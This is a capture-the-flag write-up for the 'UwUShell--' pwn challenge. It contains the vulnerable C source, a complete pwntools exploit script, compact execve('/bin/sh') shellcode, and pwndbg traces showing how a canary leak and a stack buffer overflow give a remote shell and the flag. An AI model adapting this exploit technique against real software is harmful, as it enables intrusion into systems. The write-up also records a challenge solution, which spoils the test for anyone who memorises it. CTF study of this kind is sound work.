# UwUShell--  
Description  
Solves 2  

You successfully arrived in front of the king of UwU! ─=≡Σ((( つ•̀ω•́)つ

Can you make him marvel at the power of your shellcode and get the flag? (≖ᴗ≖๑)

`nc chal.firebird.sh 35028`

[File](./program)

[Source](./source)



## Solution 
```py
from pwn import * 

binary = "./program"
context.arch = 'amd64'
#p = process(binary)
p = remote("chal.firebird.sh", 35028)
context.log_level = 'debug'
s = 'b* UwU_main+546'
#gdb.attach(p, s)
p.recvuntil("0x")
leak_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
shellcode_addr = leak_addr + 0x18 + 8 + 8
p.recvuntil("0x")
canary = int(b'0x' + p.recvuntil(b' ', drop = True), 16)

#print(hex(canary))
p.sendlineafter("how long is your shellcode?", b'48')

shellcode_addr = leak_addr + 0x18 + 8 + 8   

print(f"Leaked address: {hex(leak_addr)}")
print(f"Canary: {hex(canary)}")


shellcode1 = asm("""
xor esi, esi            
cdq
lea rdi, [rsp-0x20]
mov al, 0x3b            
syscall                
""")   



shellcode_addr = leak_addr + 0x18 + 8 + 8 # leak_addr is rbp-0x18
payload = b'/bin/sh\x00' # 8 bytes from rbp_0x10 to canary
payload += p64(canary) # perserving canary
payload += b'BBBBBBBB'
payload += p64(shellcode_addr)
payload += shellcode1

p.sendlineafter("I'm looking forward to seeing its full potential!", payload)
p.interactive()
```
## Observations
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
- `Full RELRO`: No got hijacking since the libc addresses are read-only
- `PIE enabled`: Program base address is randomized, but offset from that is fixed. For just `.text`, `.data` and `.bss` sections 
- `Stack:      Executable`: We can execute stuff on the stack (?), that means shellcode can be injected and executed there
## Source 
```c
#include <stdio.h>
#include <stdlib.h>

void UwU_main() {
    char UwU[0x8]; // 
    unsigned long long shellcode_size;

    puts("");
    puts("");
    printf("             O                O       \n");
    printf("             |\\      cɔ      /|       \n");
    printf("             | \\     /\\     / |            \n");
    printf("             |  \\   /  \\   /  |    <- What a beautiful crown, isn't it?\n");
    printf("             |   \\ /    \\ /   |               \n");
    printf("             |    V      V    |               \n");
    printf("             |                |               \n");
    printf("               %p               \n", &shellcode_size);
    printf("             %p             \n", *(unsigned long long *)(UwU + 0x8));
    puts("");
    printf("||        ||                    ||        ||\n");
    printf("||        ||                    ||        ||\n");
    printf("||        ||                    ||        ||\n");
    printf("||        ||                    ||        ||\n");
    printf("||        ||                    ||        ||\n");
    printf("||        ||                    ||        ||\n");
    printf("||        ||     ||      ||     ||        ||\n");
    printf("||        ||     ||  ||  ||     ||        ||\n");
    printf("||        ||     ||  ||  ||     ||        ||\n");
    printf("  ========         ==  ==         ========  \n");
    puts("");
    puts("");

    puts("King of UwU is here to witness the power of your shellcode!");
    puts("how long is your shellcode?");

    if (scanf("%llu", &shellcode_size) != 1) {
        puts("Invaild shellcode size will destroy my world, I wouldn't let you do that UwU.");
        exit(0);
    }

    getchar();

    if (shellcode_size > 0x30) {
        puts("No No No.Your shellcode is tooooooo long. 0x30 bytes should be enough UwU.");
        puts("Show me your shellcode!");
        fgets(UwU, 0x30, stdin);
        
    }
    else {
        puts("Wow, it seems your shellcode is going to be very powerful. I'm looking forward to seeing its full potential!");
        fgets(UwU, shellcode_size, stdin);
    }

}

int main() {
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stderr,NULL,2,0);
	UwU_main();
    puts("hmmmmm seems that your shellcode isn't powerful enough.");
	return 0;
}
```
` printf("               %p               \n", &shellcode_size);` leaks a stack address, which mean we can get exact address of where our shellcode would be located.
```py
p.recvuntil("0x")
leak_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
shellcode_addr = leak_addr + 0x18 + 8 + 8
```
`printf("             %p             \n", *(unsigned long long *)(UwU + 0x8));` leaks canary value for us to bypass it 
### Example program output 
```
             O                O       
             |\      cɔ      /|       
             | \     /\     / |            
             |  \   /  \   /  |    <- What a beautiful crown, isn't it?
             |   \ /    \ /   |               
             |    V      V    |               
             |                |               
               0x7ffc204ad878               
             0x2e0e379fc3cac100             

||        ||                    ||        ||
||        ||                    ||        ||
||        ||                    ||        ||
||        ||                    ||        ||
||        ||                    ||        ||
||        ||                    ||        ||
||        ||     ||      ||     ||        ||
||        ||     ||  ||  ||     ||        ||
||        ||     ||  ||  ||     ||        ||
  ========         ==  ==         ========  


King of UwU is here to witness the power of your shellcode!
how long is your shellcode?
```
`how long is your shellcode?` legit waits for an input that determines the size of our payload, and if it's too large it will just make it `48` bytes 
## Attack 
The main challenge of this challenge is the indeed the size of shellcode.  
Since the maximum payload size is `48` bytes, and our buffer starts at `rbp-0x10` i.e. `16` bytes from `saved old rbp`. We got `16` more bytes for `saved old rbp` and return address. Therefore, we have just `16` bytes left in our payload to write the shellcode. Like the following:  
```py
payload = b'/bin/sh\x00' # 8 bytes from rbp_0x10 to canary
payload += p64(canary) # perserving canary
payload += b'BBBBBBBB'
payload += p64(shellcode_addr)
payload += shellcode1 # <= 16 bytes
```
The way I shorten my shellcode is that I put `b'/bin/sh\x00'` somewhere else on the stack i.e. at the start of our payload. Which then I observed from `pwndbg` and got to know that it would land exactly in `rsp-0x20` during function epilogue and position and `rsp` and `rbp` changed after `leave`.

#### Right before `leave`
```
00:0000│ rsp 0x7ffce95f86a0 ◂— 0
01:0008│-018 0x7ffce95f86a8 ◂— 0x30 /* '0' */
02:0010│ rcx 0x7ffce95f86b0 ◂— 0x68732f6e69622f /* '/bin/sh' */
03:0018│-008 0x7ffce95f86b8 ◂— 0xe3d7d7d67eeb1000
04:0020│ rbp 0x7ffce95f86c0 ◂— 0x4242424242424242 ('BBBBBBBB')
```

#### Right after `leave`:  
```
00:0000│ rsp 0x7ffce95f86c8 —▸ 0x7ffce95f86d0 ◂— 0xe0247c8d4899f631
01:0008│     0x7ffce95f86d0 ◂— 0xe0247c8d4899f631
02:0010│     0x7ffce95f86d8 ◂— 0xa050f3bb0
03:0018│     0x7ffce95f86e0 —▸ 0x7ffce95f87d0 —▸ 0x7ffce95f87d8 ◂— 0x38 /* '8' */
```
And we can see that `rsp`, which is pointing to `0x7ffce95f86d0`, is exactly `0x20` bytes away from `0x7ffce95f86b0` that contains `/bin/sh` and `lea rdi, [rsp-0x20]` is able to get that.
```py
shellcode1 = asm("""
xor esi, esi            
cdq
lea rdi, [rsp-0x20]
mov al, 0x3b            
syscall                
""")   
```
And here in `pwndbg`, we can clearly see our shellcode being executed and `RDI => 0x7ffce95f86b0 ◂— 0x68732f6e69622f /* '/bin/sh' */` 
```
   0x560d297c044b <UwU_main+546>    leave  
   0x560d297c044c <UwU_main+547>    ret                                <0x7ffce95f86d0>
    ↓
 ► 0x7ffce95f86d0                   xor    esi, esi                           ESI => 0
   0x7ffce95f86d2                   cdq    
   0x7ffce95f86d3                   lea    rdi, [rsp - 0x20]                  RDI => 0x7ffce95f86b0 ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x7ffce95f86d8                   mov    al, 0x3b                           AL => 0x3b
   0x7ffce95f86da                   syscall  <SYS_execve>
   0x7ffce95f86dc                   or     al, byte ptr [rax]
   0x7ffce95f86de                   add    byte ptr [rax], al
   0x7ffce95f86e0                   rol    byte ptr [rdi + 0x7ffce95f], 1
   0x7ffce95f86e6                   add    byte ptr [rax], al
```
We let it run and we get the shell!
```
[*] Switching to interactive mode
[DEBUG] Received 0x1 bytes:
    b'\n'

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x14 bytes:
    b'UwUShell--\n'
    b'flag.txt\n'
UwUShell--
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x34 bytes:
    b'flag{r3m3mb3r_70_j01n_7h3_60lf_f0r_7h3_fr33_dr1nk!}\n'
flag{r3m3mb3r_70_j01n_7h3_60lf_f0r_7h3_fr33_dr1nk!}
$  
```
